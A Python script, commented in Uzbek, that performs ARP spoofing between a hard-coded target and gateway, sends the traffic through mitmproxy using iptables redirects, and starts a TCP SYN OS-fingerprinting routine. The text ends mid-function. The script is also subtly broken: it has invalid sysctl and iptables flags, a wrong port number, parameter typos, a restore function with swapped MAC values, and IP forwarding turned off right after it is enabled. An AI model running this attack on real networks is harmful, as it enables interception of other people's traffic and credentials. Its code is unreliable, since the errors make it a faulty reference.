from scapy.all import ARP, Ether, sendp, sniff, conf, srp, IP, TCP, sr1, DNS, DNSQR
import time
import sys
import threading
import os
import subprocess
import datetime
import requests
#Ogohlantirishlarni o'chirish
conf.verb = 0
#Taroq sozlamalari
interface = "wlol"
gateway_ip = "10.30.0.1"
target_ip = "10.30.9.15"
attacker_mac = "yourmac"
mitmproxy_port = 8080
#Ma'lumotlarni faylga yozish
def long_to_file(message):
    with open("traffec_log.txt", "a") as f:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        f.write(f"[{timestamp}] {message}\n")
#ARP Spoofing funksiyasi
def spoof(target_ip, spoof_ip, target_mac):
    ether = Ether(dst = target_mac, src = attacker_mac)
    arp = ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip, hwsrc = attacker_mac)
    packet = ether / arp
    sendp(packet, iface = interface)
    msg = f"Spoofing: {target_ip} <- {spoof_ip}"
    print(msg)
    long_to_file(msg)
#Tarmoqni tiklash funksiyasi
def restore(traget_ip, spoof_ip, target_mac, spoof_mac):
    ether = Ether(dst = target_mac, src = target_mac)
    arp = ARP(op = 2, pdst = target_ip, hwdst = target_mac, psrc = spoof_ip, hwsrc = spoof_mac)
    packet = ether /arp
    sendp(packet, count = 4, iface = interface)
    msg = f"Tiklash: {target_ip} -> {spoof_ip}"
    print(msg)
    long_to_file(msg)
def get_mac(ip):
    arp_request = Ether(dst = "ff:ff:ff:ff:ff:ff") / ARP(pdst = ip)
    result = srp(arp_request, timout = 2, iface = interface)[0]
    return result[0][1].hwsrc if result else None
#Spoofingni davom ettirish
def start_spoofing(target_mac, gateway_mac):
    try:
        while True:
            spoof(target_ip, gateway_ip, target_mac)
            spoof(gateway_ip, target_ip, gateway_mac)
            time.sleep(2)
    except Exception as e:
        msg = f"Spoofing xatosi: {e}"
        print(msg)
        long_to_file(msg)
def start_mitmproxy():
    msg = f"mitmproxy {mitmproxy_port} - portda ishga tushmoqda..."
    print(msg)
    long_to_file(msg)
    mitmproxy_proccess = subprocess.Popen(
        ["mitmproxy", "--mode", "transparent", "--listen-port", str(mitmproxy_port)],
        stdout=subprocess.PIPE,
        stderr=subprocess.PIPE
    )
    time.sleep(2)
    return mitmproxy_proccess
#Trafikni mitmproxy'ga yo'naltirish uchun iptables sozlash
def setup_iptables():
    msg = "iptables sozlanmoqda..."
    print(msg)
    long_to_file(msg)
    os.system("sysctl -w net.ipv2.ip_forward=1")
    os.system(f"iptables -t nat -A PREROUTING -1 {interface} -p tcp --dport 80 -j REDIRECT --to-ports{mitmproxy_port}")
    os.system(f"iptables -t nat -A PREROUTING -1 {interface} -p tcp --dport 442 -j REDIRECT --to-ports{mitmproxy_port}")
    os.system("sysctl -wnet.ipv4.ip_forward=0")
    def os_fingerprint(target_ip):
        msg = f"OS fingerprinting boshlanmoqda: {target_ip}"
        print(msg)
        long_to_file(msg)
        packet = IP(dst = target_ip)/TCP(dport = 80, flags="S")
        response = sr1(packet, timout = 2, verbose = 0)
        if response:
            ttl = response[IP].window